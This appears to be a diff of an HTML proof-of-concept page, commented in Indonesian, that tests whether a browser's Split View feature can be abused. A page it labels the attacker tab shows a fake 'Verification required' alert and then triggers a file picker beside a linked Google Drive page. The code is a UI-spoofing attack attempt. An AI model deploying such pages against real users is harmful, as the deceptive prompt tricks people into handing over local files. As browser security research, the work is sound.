@@ -1,79 +1,49 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-  <head>
-    <title>Split View - Alert Hold (Bypass Attempt)</title>
+<head>
+    <title>Split View - Alert Setelah Split View Terbuka</title>
     <style>
-      body {
-        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-        text-align: center;
-        padding-top: 50px;
-        background: #f0f2f5;
-      }
-      a {
-        display: inline-block;
-        background-color: #1a73e8;
-        color: white;
-        padding: 12px 24px;
-        text-decoration: none;
-        border-radius: 4px;
-        font-weight: 500;
-      }
-      a:hover {
-        background-color: #1557b0;
-      }
-      img {
-        max-width: 300px;
-        margin-top: 20px;
-        border-radius: 8px;
-        display: none;
-      }
-      p {
-        margin-top: 20px;
-        color: #5f6368;
-      }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 50px; background: #f0f2f5; }
+        a { display: inline-block; background-color: #1a73e8; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; font-weight: 500; }
+        a:hover { background-color: #1557b0; }
+        img { max-width: 300px; margin-top: 20px; border-radius: 8px; display: none; }
+        p { margin-top: 20px; color: #5f6368; }
     </style>
-  </head>
-  <body>
-    <a
-      id="trigger"
-      href="https://workspace.google.com/intl/en_in/products/drive/"
-      >Right Click → Open in Split View</a
-    >
-    <input type="file" id="fileInput" style="display: none" />
-    <img id="preview" />
-    <p>
-      After split view opens, an alert will appear. Click OK to see if file
-      picker appears.
-    </p>
+</head>
+<body>
+    <a id="trigger" href="https://workspace.google.com/intl/en_in/products/drive/">Right Click → Open in Split View</a>
+    <input type="file" id="fileInput" style="display: none;">
+    <img id="preview">
+    <p>1. Klik kanan link → pilih "Open in Split View"<br>
+    2. Setelah split view terbuka, akan muncul alert<br>
+    3. Klik OK pada alert → file picker akan muncul</p>
 
     <script>
-      const fileInput = document.getElementById("fileInput");
-      const preview = document.getElementById("preview");
+        const fileInput = document.getElementById('fileInput');
+        const preview = document.getElementById('preview');
 
-      fileInput.onchange = () => {
-        if (fileInput.files && fileInput.files[0]) {
-          preview.src = URL.createObjectURL(fileInput.files[0]);
-          preview.style.display = "block";
-        }
-      };
+        fileInput.onchange = () => {
+            if (fileInput.files && fileInput.files[0]) {
+                preview.src = URL.createObjectURL(fileInput.files[0]);
+                preview.style.display = 'block';
+            }
+        };
 
-      document
-        .getElementById("trigger")
-        .addEventListener("contextmenu", (e) => {
-          // JANGAN preventDefault biar menu konteks browser tetap muncul
-          // User bisa pilih "Open in Split View"
+        document.getElementById('trigger').addEventListener('contextmenu', (e) => {
+            // Biarkan menu konteks browser muncul, user bisa pilih "Open in Split View"
+            // Kita tidak prevent default
 
-          // Alert blocking — menahan eksekusi sampai user klik OK
-          // Selama alert, split view sudah terbuka. Alert akan memfokuskan tab ini (attacker)
-          alert(
-            "⚠️ Verification required. Click OK to continue and select a file.",
-          );
+            // Beri waktu untuk user mengklik menu split view dan split view terbuka
+            // Asumsikan 1 detik cukup
+            setTimeout(() => {
+                // Alert muncul SETELAH split view terbuka
+                alert("⚠️ Verification required. Click OK to continue and select a file.");
 
-          // Setelah OK, panggil file picker.
-          // Saat ini tab attacker sudah aktif (karena alert memunculkannya ke foreground)
-          // Dan masih dalam event handler yang sama (user gesture secara teknis masih berlangsung?)
-          fileInput.click();
+                // Setelah OK, coba buka file picker
+                // Perhatikan: saat ini user gesture asli (klik kanan) sudah kadaluwarsa
+                fileInput.click();
+            }, 1000);
         });
     </script>
-  </body>
+</body>
 </html>
